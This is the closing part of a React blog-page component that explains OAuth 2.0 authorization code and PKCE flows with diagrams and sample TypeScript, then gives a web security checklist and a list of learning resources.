                    />
                  </section>
                </section>

                {/* OAuth 2.0 */}
                <section id="oauth2" className="mb-12">
                  <h2 className="text-2xl font-display font-bold text-foreground mb-4 flex items-center gap-2">
                    <span className="text-accent">#</span> OAuth 2.0 Internals
                  </h2>
                  <p className="text-muted-foreground leading-relaxed mb-4">
                    OAuth 2.0 is the industry standard for authorization. It's how "Login with 
                    Google" works. Understanding OAuth flows is crucial for implementing secure 
                    third-party authentication.
                  </p>

                  <section id="auth-code-flow" className="mb-8">
                    <h3 className="text-xl font-display font-bold text-foreground mb-3">Authorization Code Flow</h3>
                    <p className="text-muted-foreground leading-relaxed mb-4">
                      The Authorization Code flow is the most secure OAuth flow, designed for 
                      server-side applications that can securely store secrets.
                    </p>

                    <div className="p-4 rounded-lg border border-border/50 bg-card/50 my-6">
                      <h4 className="font-bold text-foreground mb-3">Authorization Code Flow</h4>
                      <pre className="text-sm font-mono text-muted-foreground whitespace-pre-wrap">
{`┌──────────┐                              ┌──────────┐
│   User   │                              │  Google  │
│ (Browser)│                              │  (Auth)  │
└────┬─────┘                              └────┬─────┘
     │                                         │
     │ 1. Click "Login with Google"            │
     │─────────────────────────────────────────│
     │                                         │
     │ 2. Redirect to Google login             │
     │ ────────────────────────────────────────→
     │ GET /authorize?client_id=xxx            │
     │     &redirect_uri=myapp.com/callback    │
     │     &response_type=code                 │
     │     &scope=email profile                │
     │     &state=random123                    │
     │                                         │
     │ 3. User logs in, grants permission      │
     │                                         │
     │ 4. Google redirects back with code      │
     │ ←────────────────────────────────────────
     │ 302 myapp.com/callback?code=xyz         │
     │     &state=random123                    │
     │                                         │
┌────┴─────┐                              ┌────┴─────┐
│  Your    │                              │  Google  │
│  Server  │                              │  (Token) │
└────┬─────┘                              └────┬─────┘
     │                                         │
     │ 5. Exchange code for tokens             │
     │ ────────────────────────────────────────→
     │ POST /token                             │
     │   grant_type=authorization_code         │
     │   code=xyz                              │
     │   client_id=xxx                         │
     │   client_secret=SECRET  ← Only server   │
     │                                         │
     │ 6. Receive tokens                       │
     │ ←────────────────────────────────────────
     │ { access_token, refresh_token, id_token }
     │                                         │
     │ 7. Use access_token for API calls       │
     │ ────────────────────────────────────────→
     │ GET /userinfo                           │
     │ Authorization: Bearer access_token      │`}
                      </pre>
                    </div>

                    <CodeBlock
                      code={`// OAuth 2.0 Authorization Code Flow Implementation
import express from 'express';
import crypto from 'crypto';

const app = express();

// Step 1: Initiate OAuth flow
app.get('/auth/google', (req, res) => {
  // Generate random state to prevent CSRF
  const state = crypto.randomBytes(32).toString('hex');
  req.session.oauthState = state;
  
  const params = new URLSearchParams({
    client_id: process.env.GOOGLE_CLIENT_ID,
    redirect_uri: 'https://myapp.com/auth/google/callback',
    response_type: 'code',
    scope: 'openid email profile',
    state: state,
    // Optional: Force account selection
    prompt: 'select_account',
  });
  
  res.redirect(\`https://accounts.google.com/o/oauth2/v2/auth?\${params}\`);
});

// Step 2: Handle callback
app.get('/auth/google/callback', async (req, res) => {
  const { code, state, error } = req.query;
  
  // Check for errors
  if (error) {
    return res.redirect('/login?error=' + error);
  }
  
  // CRITICAL: Verify state to prevent CSRF
  if (state !== req.session.oauthState) {
    return res.status(403).send('Invalid state parameter');
  }
  delete req.session.oauthState;
  
  try {
    // Step 3: Exchange code for tokens
    const tokenResponse = await fetch('https://oauth2.googleapis.com/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        grant_type: 'authorization_code',
        code: code as string,
        client_id: process.env.GOOGLE_CLIENT_ID,
        client_secret: process.env.GOOGLE_CLIENT_SECRET, // Server-side only!
        redirect_uri: 'https://myapp.com/auth/google/callback',
      }),
    });
    
    const tokens = await tokenResponse.json();
    // tokens = { access_token, refresh_token, id_token, expires_in }
    
    // Step 4: Verify ID token and extract user info
    const decoded = jwt.decode(tokens.id_token);
    // decoded = { sub, email, name, picture, ... }
    
    // Step 5: Find or create user in your database
    let user = await db.users.findUnique({
      where: { googleId: decoded.sub }
    });
    
    if (!user) {
      user = await db.users.create({
        data: {
          googleId: decoded.sub,
          email: decoded.email,
          name: decoded.name,
          picture: decoded.picture,
        }
      });
    }
    
    // Step 6: Create session for your app
    req.session.userId = user.id;
    
    res.redirect('/dashboard');
    
  } catch (error) {
    console.error('OAuth error:', error);
    res.redirect('/login?error=oauth_failed');
  }
});`}
                      language="typescript"
                      filename="oauth_auth_code.ts"
                    />
                  </section>

                  <section id="pkce" className="mb-8">
                    <h3 className="text-xl font-display font-bold text-foreground mb-3">PKCE (Proof Key for Code Exchange)</h3>
                    <p className="text-muted-foreground leading-relaxed mb-4">
                      Mobile apps and SPAs can't safely store client secrets. <strong>PKCE</strong> (pronounced 
                      "pixie") adds security without needing a secret — it's now recommended for ALL OAuth flows.
                    </p>

                    <div className="p-4 rounded-lg border border-border/50 bg-card/50 my-6">
                      <h4 className="font-bold text-foreground mb-3">PKCE Flow</h4>
                      <pre className="text-sm font-mono text-muted-foreground whitespace-pre-wrap">
{`PROBLEM: Without client_secret, anyone who intercepts the 
authorization code can exchange it for tokens!

SOLUTION: PKCE adds a one-time proof

1. Client generates random code_verifier
   code_verifier = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"

2. Client creates code_challenge from verifier
   code_challenge = BASE64URL(SHA256(code_verifier))
   
3. Client sends code_challenge in auth request
   /authorize?...&code_challenge=E9Melhoa...&code_challenge_method=S256

4. Auth server stores code_challenge with the code

5. Client exchanges code AND code_verifier
   /token?...&code_verifier=dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk

6. Auth server verifies:
   SHA256(code_verifier) == stored code_challenge

If attacker intercepts the code, they don't have the verifier!`}
                      </pre>
                    </div>

                    <CodeBlock
                      code={`// PKCE Implementation for SPAs/Mobile
import crypto from 'crypto';

// Generate PKCE parameters
function generatePKCE(): { verifier: string; challenge: string } {
  // Generate random verifier (43-128 characters)
  const verifier = base64URLEncode(crypto.randomBytes(32));
  
  // Create challenge = BASE64URL(SHA256(verifier))
  const challenge = base64URLEncode(
    crypto.createHash('sha256').update(verifier).digest()
  );
  
  return { verifier, challenge };
}

function base64URLEncode(buffer: Buffer): string {
  return buffer
    .toString('base64')
    .replace(/\\+/g, '-')
    .replace(/\\//g, '_')
    .replace(/=/g, '');
}

// React/Mobile OAuth with PKCE
class OAuthClient {
  private codeVerifier: string | null = null;
  
  async startLogin(): Promise<void> {
    // Generate PKCE parameters
    const { verifier, challenge } = generatePKCE();
    
    // Store verifier for later (in memory or secure storage)
    this.codeVerifier = verifier;
    
    // Also store in sessionStorage for page refreshes
    sessionStorage.setItem('pkce_verifier', verifier);
    
    // Generate state
    const state = base64URLEncode(crypto.randomBytes(16));
    sessionStorage.setItem('oauth_state', state);
    
    // Build authorization URL
    const params = new URLSearchParams({
      client_id: 'your-client-id',
      redirect_uri: window.location.origin + '/callback',
      response_type: 'code',
      scope: 'openid email profile',
      state: state,
      code_challenge: challenge,
      code_challenge_method: 'S256',
    });
    
    // Redirect to auth server
    window.location.href = \`https://auth.example.com/authorize?\${params}\`;
  }
  
  async handleCallback(code: string, state: string): Promise<void> {
    // Verify state
    const storedState = sessionStorage.getItem('oauth_state');
    if (state !== storedState) {
      throw new Error('Invalid state - possible CSRF attack');
    }
    
    // Get stored verifier
    const verifier = this.codeVerifier || sessionStorage.getItem('pkce_verifier');
    if (!verifier) {
      throw new Error('Missing PKCE verifier');
    }
    
    // Exchange code for tokens (no client_secret needed!)
    const response = await fetch('https://auth.example.com/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        grant_type: 'authorization_code',
        code: code,
        client_id: 'your-client-id',
        redirect_uri: window.location.origin + '/callback',
        code_verifier: verifier,  // PKCE verifier instead of client_secret
      }),
    });
    
    const tokens = await response.json();
    
    // Clean up
    sessionStorage.removeItem('pkce_verifier');
    sessionStorage.removeItem('oauth_state');
    
    // Store tokens and update app state
    this.handleTokens(tokens);
  }
  
  private handleTokens(tokens: any): void {
    // Store access token in memory (not localStorage!)
    this.accessToken = tokens.access_token;
    
    // Store refresh token securely (if provided)
    if (tokens.refresh_token) {
      // For web: HttpOnly cookie via backend
      // For mobile: Secure storage (Keychain/Keystore)
    }
  }
}

// Usage in React component
function LoginButton() {
  const oauth = new OAuthClient();
  
  const handleLogin = () => {
    oauth.startLogin();
  };
  
  return <button onClick={handleLogin}>Login with Google</button>;
}

// Callback page
function CallbackPage() {
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const code = params.get('code');
    const state = params.get('state');
    
    if (code && state) {
      oauth.handleCallback(code, state)
        .then(() => navigate('/dashboard'))
        .catch(error => navigate('/login?error=' + error.message));
    }
  }, []);
  
  return <div>Processing login...</div>;
}`}
                      language="typescript"
                      filename="oauth_pkce.ts"
                    />

                    <BlogNote type="warning" title="Token Storage in SPAs">
                      <ul className="list-disc list-inside space-y-1 mt-2">
                        <li><strong>Never</strong> store tokens in localStorage (XSS vulnerable)</li>
                        <li>Store access tokens in memory (JavaScript variables)</li>
                        <li>Use HttpOnly cookies for refresh tokens via your backend</li>
                        <li>Or use the BFF (Backend for Frontend) pattern</li>
                      </ul>
                    </BlogNote>
                  </section>
                </section>

                {/* Security Checklist */}
                <section id="security-checklist" className="mb-12">
                  <h2 className="text-2xl font-display font-bold text-foreground mb-4 flex items-center gap-2">
                    <span className="text-accent">#</span> Security Checklist
                  </h2>

                  <div className="space-y-4 mb-6">
                    <div className="p-4 rounded-lg border border-green-500/30 bg-green-500/5">
                      <h4 className="font-bold text-green-400 mb-2">Authentication</h4>
                      <ul className="text-sm text-muted-foreground space-y-1">
                        <li>☐ Use short-lived access tokens (15 min)</li>
                        <li>☐ Implement refresh token rotation</li>
                        <li>☐ Store passwords with bcrypt/argon2</li>
                        <li>☐ Implement rate limiting on login</li>
                        <li>☐ Add MFA for sensitive accounts</li>
                      </ul>
                    </div>
                    <div className="p-4 rounded-lg border border-blue-500/30 bg-blue-500/5">
                      <h4 className="font-bold text-blue-400 mb-2">Injection Prevention</h4>
                      <ul className="text-sm text-muted-foreground space-y-1">
                        <li>☐ Use parameterized queries (never string concat)</li>
                        <li>☐ Validate and sanitize all input</li>
                        <li>☐ Use ORM with escaping (Prisma, TypeORM)</li>
                        <li>☐ Escape HTML output (or use React)</li>
                        <li>☐ Implement Content Security Policy</li>
                      </ul>
                    </div>
                    <div className="p-4 rounded-lg border border-purple-500/30 bg-purple-500/5">
                      <h4 className="font-bold text-purple-400 mb-2">Session Security</h4>
                      <ul className="text-sm text-muted-foreground space-y-1">
                        <li>☐ Use HttpOnly, Secure, SameSite cookies</li>
                        <li>☐ Implement CSRF protection</li>
                        <li>☐ Regenerate session ID on login</li>
                        <li>☐ Implement session timeout</li>
                        <li>☐ Provide "logout everywhere" option</li>
                      </ul>
                    </div>
                    <div className="p-4 rounded-lg border border-orange-500/30 bg-orange-500/5">
                      <h4 className="font-bold text-orange-400 mb-2">Headers & Transport</h4>
                      <ul className="text-sm text-muted-foreground space-y-1">
                        <li>☐ Force HTTPS (HSTS header)</li>
                        <li>☐ Set X-Content-Type-Options: nosniff</li>
                        <li>☐ Set X-Frame-Options: DENY</li>
                        <li>☐ Configure CORS properly</li>
                        <li>☐ Hide server version headers</li>
                      </ul>
                    </div>
                  </div>
                </section>

                {/* Resources */}
                <section id="resources" className="mb-12">
                  <h2 className="text-2xl font-display font-bold text-foreground mb-4 flex items-center gap-2">
                    <span className="text-accent">#</span> Resources
                  </h2>

                  <div className="p-6 rounded-xl border border-accent/30 bg-accent/5 mb-6">
                    <h4 className="font-display font-bold text-foreground mb-4">📚 Essential Reading</h4>
                    <ul className="text-muted-foreground space-y-3">
                      <li>
                        <span className="text-accent font-medium">"OWASP Top 10"</span>
                        <span className="text-sm ml-2">— The most critical web security risks</span>
                      </li>
                      <li>
                        <span className="text-accent font-medium">"OAuth 2.0 Simplified"</span>
                        <span className="text-sm ml-2">— Aaron Parecki (oauth.net)</span>
                      </li>
                      <li>
                        <span className="text-accent font-medium">"JWT Handbook"</span>
                        <span className="text-sm ml-2">— Auth0 (free PDF)</span>
                      </li>
                      <li>
                        <span className="text-accent font-medium">"Web Application Security"</span>
                        <span className="text-sm ml-2">— Andrew Hoffman (O'Reilly)</span>
                      </li>
                    </ul>
                  </div>

                  <div className="p-6 rounded-xl border border-border/50 bg-card/50 mb-6">
                    <h4 className="font-display font-bold text-foreground mb-4">🛠️ Practice</h4>
                    <div className="grid md:grid-cols-2 gap-4 text-sm">
                      <div>
                        <span className="text-foreground font-bold">CTF Platforms:</span>
                        <ul className="text-muted-foreground mt-1 space-y-1">
                          <li>• PortSwigger Web Security Academy</li>
                          <li>• OWASP WebGoat</li>
                          <li>• HackTheBox</li>
                          <li>• PentesterLab</li>
                        </ul>
                      </div>
                      <div>
                        <span className="text-foreground font-bold">Tools:</span>
                        <ul className="text-muted-foreground mt-1 space-y-1">
                          <li>• Burp Suite (intercept requests)</li>
                          <li>• jwt.io (decode JWTs)</li>
                          <li>• OWASP ZAP (vulnerability scanner)</li>
                          <li>• Snyk (dependency scanning)</li>
                        </ul>
                      </div>
                    </div>
                  </div>

                  <BlogNote type="success" title="Career Impact">
                    Security knowledge is rare and valuable. Developers who understand these 
                    concepts are in high demand. This knowledge also shows up in system design 
                    interviews and can differentiate you from other candidates!
                  </BlogNote>
                </section>

              </div>
            </main>
          </div>
        </div>
      </article>
    </div>
  );
};

export default SecurityCoding;
